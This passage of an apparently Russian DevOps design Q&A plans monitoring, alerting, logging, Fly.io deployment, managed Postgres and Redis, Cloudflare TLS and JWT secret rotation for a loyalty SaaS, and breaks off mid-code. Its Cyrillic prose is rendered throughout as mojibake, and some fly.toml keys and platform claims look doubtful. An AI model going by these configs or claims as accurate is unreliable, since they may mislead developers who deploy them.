**–ò–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–Ω—ã–µ –º–µ—Ç—Ä–∏–∫–∏:**

- ‚úÖ CPU usage (< 80%)
- ‚úÖ Memory usage (< 85%)
- ‚úÖ Disk usage (< 90%)
- ‚úÖ Network I/O

**Application –º–µ—Ç—Ä–∏–∫–∏:**

- ‚úÖ HTTP request rate (requests/sec)
- ‚úÖ Response time (p50, p95, p99)
- ‚úÖ Error rate (< 1%)
- ‚úÖ Active connections

**Database –º–µ—Ç—Ä–∏–∫–∏:**

- ‚úÖ Connection pool usage
- ‚úÖ Query duration (slow queries > 1s)
- ‚úÖ Deadlocks
- ‚úÖ Database size

**Business –º–µ—Ç—Ä–∏–∫–∏:**

- ‚úÖ –ì–æ—Å—Ç–µ–π —Å–æ–∑–¥–∞–Ω–æ/–¥–µ–Ω—å
- ‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –±–∞–ª–ª–æ–≤/—á–∞—Å
- ‚úÖ POS webhook failures
- ‚úÖ Telegram bot –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å

**–†–µ–∞–ª–∏–∑–∞—Ü–∏—è:**

```typescript
// apps/backend/src/monitoring/metrics.service.ts
import { Injectable } from '@nestjs/common';
import { Logtail } from '@logtail/node';

@Injectable()
export class MetricsService {
  private logtail = new Logtail(process.env.BETTER_STACK_TOKEN);

  // HTTP metrics
  trackRequest(method: string, path: string, statusCode: number, duration: number) {
    this.logtail.info('http_request', {
      method,
      path,
      status_code: statusCode,
      duration_ms: duration,
      timestamp: new Date().toISOString(),
    });
  }

  // Business metrics
  trackGuestCreated(tenantId: string, source: 'cashier' | 'link' | 'telegram') {
    this.logtail.info('guest_created', {
      tenant_id: tenantId,
      source,
      timestamp: new Date().toISOString(),
    });
  }

  trackBallTransaction(
    tenantId: string,
    type: 'earn' | 'redeem',
    amount: number,
    source: 'pos' | 'manual' | 'promo',
  ) {
    this.logtail.info('ball_transaction', {
      tenant_id: tenantId,
      type,
      amount,
      source,
      timestamp: new Date().toISOString(),
    });
  }

  trackPOSWebhook(
    tenantId: string,
    status: 'success' | 'failed',
    provider: 'iiko' | 'rkeeper',
    error?: string,
  ) {
    this.logtail.info('pos_webhook', {
      tenant_id: tenantId,
      status,
      provider,
      error,
      timestamp: new Date().toISOString(),
    });
  }

  // Error tracking
  trackError(error: Error, context: Record<string, any>) {
    this.logtail.error('application_error', {
      error_message: error.message,
      error_stack: error.stack,
      ...context,
      timestamp: new Date().toISOString(),
    });
  }
}
```

**Middleware –¥–ª—è HTTP –º–µ—Ç—Ä–∏–∫:**

```typescript
// monitoring/metrics.middleware.ts
import { Injectable, NestMiddleware } from '@nestjs/common';
import { Request, Response, NextFunction } from 'express';
import { MetricsService } from './metrics.service';

@Injectable()
export class MetricsMiddleware implements NestMiddleware {
  constructor(private metrics: MetricsService) {}

  use(req: Request, res: Response, next: NextFunction) {
    const start = Date.now();

    res.on('finish', () => {
      const duration = Date.now() - start;
      this.metrics.trackRequest(
        req.method,
        req.path,
        res.statusCode,
        duration,
      );
    });

    next();
  }
}
```


***

### **1Ô∏è‚É£4Ô∏è‚É£ Alerting: –ö–æ–≥–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è?**

**–í–û–ü–†–û–°:** –ö–∞–∫–∏–µ –∞–ª–µ—Ä—Ç—ã –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –≤ Better Stack?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï:**

**üî¥ CRITICAL (—Å—Ä–∞–∑—É –≤ Telegram):**

- ‚úÖ Backend down (> 2 –º–∏–Ω—É—Ç—ã)
- ‚úÖ Database unavailable
- ‚úÖ Error rate > 5%
- ‚úÖ Memory usage > 95%
- ‚úÖ Payment webhook failed (YooKassa)

**üü° WARNING (email –∏–ª–∏ Telegram —Ä–∞–∑ –≤ —á–∞—Å):**

- ‚úÖ Response time p95 > 2s
- ‚úÖ Disk usage > 80%
- ‚úÖ Slow queries > 5s
- ‚úÖ POS webhook failures > 10/hour

**üü¢ INFO (—Ç–æ–ª—å–∫–æ –≤ –¥–∞—à–±–æ—Ä–¥):**

- ‚úÖ New tenant registered
- ‚úÖ Subscription upgraded
- ‚úÖ Large ball transaction (> 10,000)

**Better Stack –Ω–∞—Å—Ç—Ä–æ–π–∫–∞:**

```yaml
# better-stack-config.yml (–∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º —á–µ—Ä–µ–∑ UI)
monitors:
  - name: Backend API Health
    url: https://api.max-loyalty.com/health
    interval: 60  # –∫–∞–∂–¥—É—é –º–∏–Ω—É—Ç—É
    threshold: 2  # 2 –Ω–µ—É–¥–∞—á–∏ –ø–æ–¥—Ä—è–¥ = alert
    notifications:
      - type: telegram
        channel: "@max_loyalty_alerts"
      - type: email
        recipients: ["admin@max-loyalty.com"]

  - name: Database Connections
    type: metric
    query: "database.connections.active"
    threshold: "> 90"
    severity: warning

  - name: Error Rate
    type: metric
    query: "http.errors.rate"
    threshold: "> 5%"
    severity: critical
    notifications:
      - type: telegram
        channel: "@max_loyalty_alerts"
```


***

### **1Ô∏è‚É£5Ô∏è‚É£ Logging: –ß—Ç–æ –ª–æ–≥–∏—Ä–æ–≤–∞—Ç—å –∏ –≤ –∫–∞–∫–æ–º —Ñ–æ—Ä–º–∞—Ç–µ?**

**–í–û–ü–†–û–°:** –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ª–æ–≥–æ–≤ –∏ —á—Ç–æ –≤–∫–ª—é—á–∞—Ç—å?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Structured JSON logs**

```typescript
// apps/backend/src/logging/logger.service.ts
import { Injectable, LoggerService as NestLoggerService } from '@nestjs/common';
import { Logtail } from '@logtail/node';
import { createLogger, format, transports } from 'winston';

@Injectable()
export class LoggerService implements NestLoggerService {
  private logtail = new Logtail(process.env.BETTER_STACK_TOKEN);
  
  private winston = createLogger({
    level: process.env.LOG_LEVEL || 'info',
    format: format.combine(
      format.timestamp(),
      format.errors({ stack: true }),
      format.json(),
    ),
    defaultMeta: {
      service: 'max-loyalty-backend',
      environment: process.env.NODE_ENV,
    },
    transports: [
      new transports.Console({
        format: format.combine(
          format.colorize(),
          format.simple(),
        ),
      }),
    ],
  });

  log(message: string, context?: Record<string, any>) {
    this.winston.info(message, context);
    this.logtail.info(message, context);
  }

  error(message: string, trace?: string, context?: Record<string, any>) {
    this.winston.error(message, { trace, ...context });
    this.logtail.error(message, { trace, ...context });
  }

  warn(message: string, context?: Record<string, any>) {
    this.winston.warn(message, context);
    this.logtail.warn(message, context);
  }

  debug(message: string, context?: Record<string, any>) {
    this.winston.debug(message, context);
    // –ù–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º debug –≤ Better Stack (—ç–∫–æ–Ω–æ–º–∏–º –∫–≤–æ—Ç—É)
  }

  verbose(message: string, context?: Record<string, any>) {
    this.winston.verbose(message, context);
  }
}
```

**–ß—Ç–æ –ª–æ–≥–∏—Ä—É–µ–º:**

```typescript
// ‚úÖ DO: –õ–æ–≥–∏—Ä—É–µ–º –±–∏–∑–Ω–µ—Å-—Å–æ–±—ã—Ç–∏—è
logger.log('Guest created', {
  guestId: guest.id,
  tenantId: tenant.id,
  source: 'telegram',
  userId: user.id,
});

logger.log('Ball transaction completed', {
  transactionId: tx.id,
  guestId: guest.id,
  type: 'earn',
  amount: 500,
  balanceBefore: 1000,
  balanceAfter: 1500,
});

// ‚úÖ DO: –õ–æ–≥–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ —Å –∫–æ–Ω—Ç–µ–∫—Å—Ç–æ–º
logger.error('Failed to process POS webhook', {
  error: error.message,
  stack: error.stack,
  webhookId: webhook.id,
  provider: 'iiko',
  checkId: check.id,
});

// ‚ùå DON'T: –ù–µ –ª–æ–≥–∏—Ä—É–µ–º sensitive data
logger.log('User logged in', {
  userId: user.id,
  email: user.email,  // ‚ùå
  password: user.password,  // ‚ùå‚ùå‚ùå
});

// ‚úÖ DO: –ú–∞—Å–∫–∏—Ä—É–µ–º sensitive data
logger.log('User logged in', {
  userId: user.id,
  email: maskEmail(user.email),  // "a***@example.com"
});

// ‚ùå DON'T: –ù–µ –ª–æ–≥–∏—Ä—É–µ–º –≤ —Ü–∏–∫–ª–∞—Ö (–ø–µ—Ä–µ–ø–æ–ª–Ω—è–µ—Ç –∫–≤–æ—Ç—É)
guests.forEach(guest => {
  logger.log('Processing guest', { guestId: guest.id });  // ‚ùå
});

// ‚úÖ DO: –õ–æ–≥–∏—Ä—É–µ–º batch –æ–ø–µ—Ä–∞—Ü–∏–∏
logger.log('Processing guests batch', {
  count: guests.length,
  tenantId: tenant.id,
});
```


***

## üöÄ **–ë–õ–û–ö 3: FLY.IO DEPLOYMENT (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **1Ô∏è‚É£6Ô∏è‚É£ Fly.io –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è: –°–∫–æ–ª—å–∫–æ VM –∏ –∫–∞–∫–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞?**

**–í–û–ü–†–û–°:** –ö–∞–∫ —Ä–∞—Å–ø—Ä–µ–¥–µ–ª–∏—Ç—å 3 –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö VM –Ω–∞ free tier?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   VM 1: Backend API (256 MB RAM)       ‚îÇ
‚îÇ   - NestJS HTTP server                  ‚îÇ
‚îÇ   - Health checks                       ‚îÇ
‚îÇ   - WebSockets (–¥–ª—è Telegram)           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   VM 2: Worker (256 MB RAM)             ‚îÇ
‚îÇ   - BullMQ job processor                ‚îÇ
‚îÇ   - Email/SMS sending                   ‚îÇ
‚îÇ   - Analytics aggregation               ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   VM 3: Cron Jobs (256 MB RAM)          ‚îÇ
‚îÇ   - Daily ball expiration check         ‚îÇ
‚îÇ   - Level recalculation                 ‚îÇ
‚îÇ   - Reconciliation jobs                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**fly.toml:**

```toml
# apps/backend/fly.toml
app = "max-loyalty-prod"
primary_region = "fra"  # Frankfurt (–±–ª–∏–∂–µ –∫ –†–§ –∫–ª–∏–µ–Ω—Ç–∞–º)

[build]
  dockerfile = "Dockerfile"

[env]
  NODE_ENV = "production"
  PORT = "3000"

[processes]
  api = "node dist/main.js"
  worker = "node dist/main.js"
  cron = "node dist/main.js"

[processes.env]
  api.PROCESS_TYPE = "api"
  worker.PROCESS_TYPE = "worker"
  cron.PROCESS_TYPE = "cron"

# VM –¥–ª—è API (–æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç HTTP)
[[vm]]
  processes = ["api"]
  memory = "256mb"
  cpu_kind = "shared"
  cpus = 1

# VM –¥–ª—è Worker
[[vm]]
  processes = ["worker"]
  memory = "256mb"
  cpu_kind = "shared"
  cpus = 1

# VM –¥–ª—è Cron
[[vm]]
  processes = ["cron"]
  memory = "256mb"
  cpu_kind = "shared"
  cpus = 1

# HTTP service (—Ç–æ–ª—å–∫–æ –¥–ª—è API process)
[[services]]
  processes = ["api"]
  protocol = "tcp"
  internal_port = 3000

  [[services.ports]]
    port = 80
    handlers = ["http"]
    force_https = true

  [[services.ports]]
    port = 443
    handlers = ["tls", "http"]

  [services.concurrency]
    type = "connections"
    hard_limit = 250
    soft_limit = 200

  [[services.tcp_checks]]
    interval = "15s"
    timeout = "2s"
    grace_period = "10s"

  [[services.http_checks]]
    interval = "30s"
    timeout = "5s"
    grace_period = "10s"
    method = "get"
    path = "/health/ready"
    protocol = "http"

# Release command (–º–∏–≥—Ä–∞—Ü–∏–∏)
[deploy]
  release_command = "npx prisma migrate deploy && npx prisma generate"
  strategy = "rolling"

# –ê–≤—Ç–æ—Å–∫–µ–π–ª–∏–Ω–≥ (–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ –Ω–∞ free tier, –Ω–æ –æ—Å—Ç–∞–≤–∏–º –¥–ª—è –±—É–¥—É—â–µ–≥–æ)
[scaling]
  min_machines = 1
  max_machines = 3  # –ü—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –Ω–∞ –ø–ª–∞—Ç–Ω—ã–π –ø–ª–∞–Ω
```


***

### **1Ô∏è‚É£7Ô∏è‚É£ PostgreSQL –Ω–∞ Fly.io: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –∏–ª–∏ Neon.tech?**

**–í–û–ü–†–û–°:** Fly.io PostgreSQL vs Neon.tech?

**–°–†–ê–í–ù–ï–ù–ò–ï:**


| –ü–∞—Ä–∞–º–µ—Ç—Ä | Fly.io PostgreSQL | Neon.tech |
| :-- | :-- | :-- |
| Storage | 3 GB | 3 GB |
| RAM | 256 MB | 0.5 GB |
| Backups | –í—Ä—É—á–Ω—É—é | –ê–≤—Ç–æ (point-in-time) |
| Branching | ‚ùå | ‚úÖ (git-like branches) |
| Connection pooling | –ù—É–∂–Ω–æ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å | ‚úÖ –í—Å—Ç—Ä–æ–µ–Ω |
| Latency | –ù–∏–∑–∫–∞—è (—Ç–∞ –∂–µ –∑–æ–Ω–∞) | +10-20ms |
| Maintenance | –°–∞–º | Managed |


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: Neon.tech**

**–ü–æ—á–µ–º—É:**

- ‚úÖ Database branching (—Å–æ–∑–¥–∞—ë–º –∫–æ–ø–∏—é –¥–ª—è —Ç–µ—Å—Ç–æ–≤)
- ‚úÖ –ê–≤—Ç–æ–±—ç–∫–∞–ø—ã (point-in-time restore)
- ‚úÖ Connection pooling –∏–∑ –∫–æ—Ä–æ–±–∫–∏
- ‚úÖ –ù–µ –Ω—É–∂–Ω–æ –æ–±—Å–ª—É–∂–∏–≤–∞—Ç—å

**Setup:**

```bash
# –°–æ–∑–¥–∞—ë–º Neon database
neon projects create max-loyalty-prod --region eu-central-1

# –ü–æ–ª—É—á–∞–µ–º connection string
neon connection-string max-loyalty-prod

# –î–æ–±–∞–≤–ª—è–µ–º –≤ Fly.io secrets
fly secrets set DATABASE_URL="postgresql://user:pass@neon.tech:5432/max_loyalty_prod"
```

**Connection pooling –≤ Prisma:**

```typescript
// prisma/schema.prisma
datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
  directUrl = env("DIRECT_DATABASE_URL")  // –î–ª—è –º–∏–≥—Ä–∞—Ü–∏–π
}

generator client {
  provider = "prisma-client-js"
  previewFeatures = ["driverAdapters"]
}
```

```typescript
// database/prisma.service.ts
import { Injectable, OnModuleInit, OnModuleDestroy } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';

@Injectable()
export class PrismaService extends PrismaClient implements OnModuleInit, OnModuleDestroy {
  constructor() {
    super({
      datasources: {
        db: {
          url: process.env.DATABASE_URL,
        },
      },
      log: process.env.NODE_ENV === 'development' 
        ? ['query', 'error', 'warn'] 
        : ['error'],
    });
  }

  async onModuleInit() {
    await this.$connect();
  }

  async onModuleDestroy() {
    await this.$disconnect();
  }
}
```


***

### **1Ô∏è‚É£8Ô∏è‚É£ Redis –Ω–∞ Fly.io: –í—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –∏–ª–∏ Upstash?**

**–í–û–ü–†–û–°:** Upstash Serverless Redis vs Fly.io Redis?

**–°–†–ê–í–ù–ï–ù–ò–ï:**


| –ü–∞—Ä–∞–º–µ—Ç—Ä | Fly.io Redis | Upstash |
| :-- | :-- | :-- |
| Storage | –ó–∞–≤–∏—Å–∏—Ç –æ—Ç VM | 256 MB |
| Commands | Unlimited | 10,000/–¥–µ–Ω—å |
| Latency | <1ms | 5-20ms |
| Persistence | –ù—É–∂–Ω–æ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å | ‚úÖ –ê–≤—Ç–æ |
| Multi-region | ‚ùå | ‚úÖ |
| Pricing | –ó–∞–Ω–∏–º–∞–µ—Ç VM | Free 10k/day |


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: Upstash –¥–ª—è MVP**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –ù–µ –∑–∞–Ω–∏–º–∞–µ—Ç VM (—ç–∫–æ–Ω–æ–º–∏–º –¥–ª—è Backend/Worker/Cron)
- ‚úÖ 10,000 commands —Ö–≤–∞—Ç–∏—Ç –¥–ª—è MVP
- ‚úÖ Multi-region (–Ω–∏–∑–∫–∞—è latency)
- ‚úÖ REST API (fallback –µ—Å–ª–∏ Redis client –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç)

**Setup:**

```bash
# –°–æ–∑–¥–∞—ë–º Upstash Redis
# https://console.upstash.com/redis

# –î–æ–±–∞–≤–ª—è–µ–º –≤ Fly secrets
fly secrets set REDIS_URL="redis://default:pass@upstash.io:6379"
fly secrets set UPSTASH_REDIS_REST_URL="https://xxx.upstash.io"
fly secrets set UPSTASH_REDIS_REST_TOKEN="xxx"
```

**Redis service:**

```typescript
// apps/backend/src/redis/redis.service.ts
import { Injectable, OnModuleInit, OnModuleDestroy } from '@nestjs/common';
import Redis from 'ioredis';

@Injectable()
export class RedisService implements OnModuleInit, OnModuleDestroy {
  private client: Redis;

  async onModuleInit() {
    this.client = new Redis(process.env.REDIS_URL, {
      maxRetriesPerRequest: 3,
      enableReadyCheck: true,
      lazyConnect: false,
    });

    this.client.on('error', (err) => {
      console.error('Redis error:', err);
    });

    this.client.on('connect', () => {
      console.log('‚úÖ Redis connected');
    });
  }

  async onModuleDestroy() {
    await this.client.quit();
  }

  // Proxy methods
  async get(key: string): Promise<string | null> {
    return this.client.get(key);
  }

  async set(key: string, value: string, ttl?: number): Promise<void> {
    if (ttl) {
      await this.client.setex(key, ttl, value);
    } else {
      await this.client.set(key, value);
    }
  }

  async del(key: string): Promise<void> {
    await this.client.del(key);
  }

  async ping(): Promise<string> {
    return this.client.ping();
  }

  // For BullMQ
  getClient(): Redis {
    return this.client;
  }
}
```


***

### **1Ô∏è‚É£9Ô∏è‚É£ Fly.io —Ä–µ–≥–∏–æ–Ω—ã: –ì–¥–µ —Ä–∞–∑–º–µ—â–∞—Ç—å VM?**

**–í–û–ü–†–û–°:** –í –∫–∞–∫–æ–º —Ä–µ–≥–∏–æ–Ω–µ Fly.io —Ä–∞–∑–≤–æ—Ä–∞—á–∏–≤–∞—Ç—å –¥–ª—è –†–§ –∫–ª–∏–µ–Ω—Ç–æ–≤?

**–î–æ—Å—Ç—É–ø–Ω—ã–µ —Ä–µ–≥–∏–æ–Ω—ã –±–ª–∏–∑–∫–æ –∫ –†–§:**


| –†–µ–≥–∏–æ–Ω | –ö–æ–¥ | Latency –∏–∑ –ú–æ—Å–∫–≤—ã |
| :-- | :-- | :-- |
| Frankfurt, Germany | `fra` | ~40ms ‚≠ê |
| Amsterdam, Netherlands | `ams` | ~50ms |
| Warsaw, Poland | `waw` | ~45ms |
| Stockholm, Sweden | `arn` | ~55ms |


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: `fra` (Frankfurt)**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –°–∞–º—ã–π –Ω–∏–∑–∫–∏–π latency –∏–∑ –ú–æ—Å–∫–≤—ã (~40ms)
- ‚úÖ –ö—Ä—É–ø–Ω—ã–π –¥–∞—Ç–∞—Ü–µ–Ω—Ç—Ä (—Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç—å)
- ‚úÖ Neon.tech —Ç–æ–∂–µ –∏–º–µ–µ—Ç `eu-central-1` (—Ñ—Ä–∞–Ω–∫—Ñ—É—Ä—Ç)

**fly.toml:**

```toml
primary_region = "fra"
```


***

### **2Ô∏è‚É£0Ô∏è‚É£ Blue-Green deployment: –ö–∞–∫ –¥–µ–ª–∞—Ç—å zero-downtime deploys?**

**–í–û–ü–†–û–°:** –°—Ç—Ä–∞—Ç–µ–≥–∏—è –¥–µ–ø–ª–æ—è –±–µ–∑ –ø—Ä–æ—Å—Ç–æ—è?

**–í–∞—Ä–∏–∞–Ω—Ç—ã –Ω–∞ Fly.io:**

**A) Rolling deployment (default)** ‚≠ê

```toml
[deploy]
  strategy = "rolling"
  wait_timeout = "5m"
```

- –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Å—Ç–∞—Ä—ã–π –∏–Ω—Å—Ç–∞–Ω—Å ‚Üí –∑–∞–ø—É—Å–∫–∞–µ—Ç –Ω–æ–≤—ã–π ‚Üí –ø—Ä–æ–≤–µ—Ä—è–µ—Ç health ‚Üí –ø–µ—Ä–µ–∫–ª—é—á–∞–µ—Ç —Ç—Ä–∞—Ñ–∏–∫

**B) Canary deployment**

```toml
[deploy]
  strategy = "canary"
```

- 10% —Ç—Ä–∞—Ñ–∏–∫–∞ –Ω–∞ –Ω–æ–≤—ã–π ‚Üí –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –º–µ—Ç—Ä–∏–∫–∏ ‚Üí —Ä–∞—Å–∫–∞—Ç—ã–≤–∞–µ—Ç –Ω–∞ 100%

**C) Blue-Green (manual)**

```bash
# –î–µ–ø–ª–æ–∏–º –Ω–∞ staging
fly deploy -a max-loyalty-staging

# –¢–µ—Å—Ç–∏—Ä—É–µ–º
curl https://staging.max-loyalty.com/health

# –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º —Ç—Ä–∞—Ñ–∏–∫ –Ω–∞ staging
fly scale count 0 -a max-loyalty-prod
fly scale count 1 -a max-loyalty-staging
fly apps rename max-loyalty-staging max-loyalty-prod
```


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: A) Rolling (–Ω–∞ free tier), B) Canary (–Ω–∞ –ø–ª–∞—Ç–Ω–æ–º)**

**–ü–æ—á–µ–º—É:**

- ‚úÖ Rolling = zero-downtime –Ω–∞ 1 VM (health check –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ–º)
- ‚úÖ Canary = —Å–Ω–∏–∂–∞–µ—Ç —Ä–∏—Å–∫ –ø—Ä–∏ –±–æ–ª—å—à–∏—Ö –∏–∑–º–µ–Ω–µ–Ω–∏—è—Ö

**fly.toml:**

```toml
[deploy]
  strategy = "rolling"
  wait_timeout = "5m"
  
  # Health checks –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ–º —Ç—Ä–∞—Ñ–∏–∫–∞
  [deploy.health_checks]
    [deploy.health_checks.http]
      protocol = "http"
      port = 3000
      path = "/health/ready"
      interval = "10s"
      timeout = "2s"
      grace_period = "30s"
```


***

## üîí **–ë–õ–û–ö 4: SECURITY \& SECRETS (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **2Ô∏è‚É£1Ô∏è‚É£ SSL/TLS certificates: –ö–∞–∫ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å HTTPS?**

**–í–û–ü–†–û–°:** Cloudflare –∏–ª–∏ Let's Encrypt?

**–°–†–ê–í–ù–ï–ù–ò–ï:**


| –í–∞—Ä–∏–∞–Ω—Ç | –ü–ª—é—Å—ã | –ú–∏–Ω—É—Å—ã |
| :-- | :-- | :-- |
| **Fly.io Auto SSL** | –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π Let's Encrypt | –¢–æ–ª—å–∫–æ –¥–ª—è `*.fly.dev` |
| **Cloudflare Proxy** ‚≠ê | CDN + DDoS protection + Free SSL | +5-10ms latency |
| **Let's Encrypt Manual** | –ö–æ–Ω—Ç—Ä–æ–ª—å | –ù—É–∂–Ω–æ –æ–±–Ω–æ–≤–ª—è—Ç—å –∫–∞–∂–¥—ã–µ 90 –¥–Ω–µ–π |


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: Cloudflare (Free plan)**

**–ü–æ—á–µ–º—É:**

- ‚úÖ Free SSL (auto-renew)
- ‚úÖ CDN (–∫—ç—à–∏—Ä—É–µ—Ç static assets)
- ‚úÖ DDoS protection
- ‚úÖ Web Application Firewall (WAF)
- ‚úÖ DNS management
- ‚úÖ R2 Storage —É–∂–µ –µ—Å—Ç—å (–∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è)

**Setup:**

```bash
# 1. –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –¥–æ–º–µ–Ω –Ω–∞ Cloudflare
# max-loyalty.com ‚Üí Cloudflare DNS

# 2. –î–æ–±–∞–≤–ª—è–µ–º DNS records
api.max-loyalty.com ‚Üí CNAME ‚Üí max-loyalty-prod.fly.dev
app.max-loyalty.com ‚Üí CNAME ‚Üí max-loyalty-frontend.vercel.app

# 3. SSL Mode: Full (strict)
# Cloudflare ‚Üê[SSL]‚Üí Fly.io ‚Üê[SSL]‚Üí Backend

# 4. Page Rules (–∫—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ)
# api.max-loyalty.com/static/* ‚Üí Cache Everything, TTL 1 month
```

**Cloudflare settings:**

```
SSL/TLS: Full (strict)
Always Use HTTPS: On
Automatic HTTPS Rewrites: On
Minimum TLS Version: 1.2
TLS 1.3: On

Firewall Rules:
- Block requests from countries: None (–¥–ª—è –†–§ –∫–ª–∏–µ–Ω—Ç–æ–≤)
- Rate limiting: 100 req/min per IP –¥–ª—è /api/*
- Challenge on threat score > 50
```


***

### **2Ô∏è‚É£2Ô∏è‚É£ Secrets rotation: –ö–∞–∫ –æ–±–Ω–æ–≤–ª—è—Ç—å JWT secrets –±–µ–∑ downtime?**

**–í–û–ü–†–û–°:** –ù—É–∂–Ω–æ –æ–±–Ω–æ–≤–∏—Ç—å JWT_SECRET. –ö–∞–∫ –Ω–µ —Ä–∞–∑–ª–æ–≥–∏–Ω–∏—Ç—å –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Dual secrets period**

```typescript
// config/jwt.config.ts
export const jwtConfig = {
  // Primary secret (–∏—Å–ø–æ–ª—å–∑—É–µ–º –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ –Ω–æ–≤—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤)
  secret: process.env.JWT_SECRET,
  
